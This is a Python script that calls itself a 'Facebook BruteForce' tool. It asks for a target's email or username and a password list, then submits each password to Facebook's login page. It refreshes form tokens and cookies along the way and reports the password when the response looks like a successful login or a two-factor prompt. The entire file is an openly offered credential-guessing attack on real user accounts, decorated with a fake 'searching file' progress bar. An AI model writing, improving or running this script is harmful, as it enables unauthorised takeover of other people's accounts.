import os.path
import requests
import colorama
from colorama import *
from bs4 import BeautifulSoup
import sys
from tqdm import tqdm
import os
import sys
colorama.init(autoreset=True)
if os.environ == "NT":
    os.system("cls")
else:
    os.system("clear")


if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')
    sys.exit()

MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print(f'{Fore.LIGHTBLUE_EX}\npassword found is: ', password)
        return True
    return False


if __name__ == "__main__":
    print(f"""{Fore.LIGHTGREEN_EX}
    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
    $$                                                        $$
    $$        🐂Welcome To Facebook BruteForce🐂              $$
    $$                                                        $$ 
    $$         ~Developer💻: palanga-ng~                      $$
    $$    NOTE: this official by IAmBlackH4cker!              $$  
    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
    """)
    email = input(f'{Fore.LIGHTCYAN_EX}Enter Email/Username to target: ').strip()
    if email == "":
        print("Target ID cannot be empty! ")
        os.system(exit("exiting..."))
    PASSWORD_FILE = input(f"{Fore.LIGHTCYAN_EX}Select password.txt: "+" ")
    if PASSWORD_FILE == "":
        print("Password field cannot be empty..")
        os.system(exit("exiting..."))
    loop = tqdm(total=10000, position=1, leave=False)
    for i in range(20000):
        loop.set_description(f"{Fore.LIGHTMAGENTA_EX}  Searching File...".format(i))
        loop.update(1)
    if not os.path.isfile(PASSWORD_FILE):
        print(f"{Fore.LIGHTRED_EX}\nPassword file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print(f"\n{Fore.LIGHTMAGENTA_EX}Password file selected: ", PASSWORD_FILE)
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print(f"{Fore.LIGHTMAGENTA_EX}Trying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
